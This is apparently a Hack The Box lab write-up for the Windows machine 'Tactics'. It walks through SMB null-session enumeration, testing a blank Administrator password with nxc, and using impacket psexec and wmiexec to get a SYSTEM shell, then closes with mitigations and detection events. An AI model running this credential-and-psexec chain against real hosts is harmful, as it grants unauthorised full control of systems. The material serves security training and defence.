---
machine: Tactics
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, smb, blank-password, psexec, tier1]
---

# Tactics — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 1 · Windows · Very Easy

## TL;DR

**SMB (445/tcp)** allows a null session and lists the shares. `Administrator` has a **blank password**, so `psexec` with that password returns a **SYSTEM** shell and the flag sits on the administrator's desktop.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server
```

- A Windows host with no web or WinRM: SMB/RPC is the surface.
- `nmap --script smb-os-discovery` confirms the host and workgroup.

## Enumeration

```bash
smbclient -L //<TARGET_IP> -N
```

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

- The null session works: no password needed to list.
- The admin shares (`C$`, `ADMIN$`) are the way in once you have credentials.

With `nxc`/`crackmapexec`, check the authentication state:

```bash
nxc smb <TARGET_IP> -u Administrator -p ''
```

```text
SMB  <TARGET_IP>  445  TACTICS  [+] TACTICS\Administrator: (Pwn3d!)
```

## Foothold

Blank password → valid authentication. `psexec` uploads a temporary service and returns a shell as `NT AUTHORITY\SYSTEM`:

```bash
impacket-psexec 'Administrator:@<TARGET_IP>'
```

```text
[*] Requesting shares on <TARGET_IP>.....
[*] Found writable share ADMIN$
[*] Uploading file ...exe
[*] Creating service ...
Microsoft Windows [Version 10.0...]
C:\Windows\system32> whoami
nt authority\system
```

```text
type C:\Users\Administrator\Desktop\flag.txt
```

`wmiexec` also works if service creation is blocked:

```bash
impacket-wmiexec 'Administrator:@<TARGET_IP>'
```

## Lateral movement

- Not applicable: one host and one local account with full privileges.
- With a domain, the next step would be `bloodhound`/`nxc` enumeration.

## Privilege escalation

- Not applicable: `psexec` already delivers **SYSTEM**.
- Two causes combine: a passwordless account **and** the ability to create services over SMB.

## Evidence

- SMB listing over a null session.
- `whoami` as SYSTEM and the flag redacted.

## Lessons learned

- Trying a blank `Administrator` password is a one-liner that still works in labs and neglected networks.
- An SMB null session does more than list shares: it confirms the authentication policy.
- `psexec` needs write access to `ADMIN$`; if it fails, `wmiexec` uses a different channel (DCOM/WMI).
- `nxc smb` flags `Pwn3d!` when the account is a local admin, saving blind attempts.

## Mitigations and detection

**How to fix it:**

- A password policy that forbids blank values and enforces length/complexity.
- Disable null sessions (`RestrictAnonymous=1`, `EveryoneIncludesAnonymous=0`).
- Require SMB signing and restrict 445/135 to the management network.
- Disable or rename `Administrator` and use LAPS for local accounts.

**How it would be detected:**

- Event 4624 type 3 with `Administrator` and an empty password.
- Remote service creation (7045) right after an SMB connection.
- Access to `ADMIN$` from non-admin workstations.

- CWE-258: Empty Password in Configuration File
- CWE-521: Weak Password Requirements
- MITRE ATT&CK: [T1078.001](https://attack.mitre.org/techniques/T1078/001/), [T1021.002](https://attack.mitre.org/techniques/T1021/002/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

## References

- [Impacket — psexec.py](https://github.com/fortra/impacket)
- [Microsoft — anonymous SMB enumeration](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-allow-anonymous-enumeration-of-sam-accounts-and-shares)
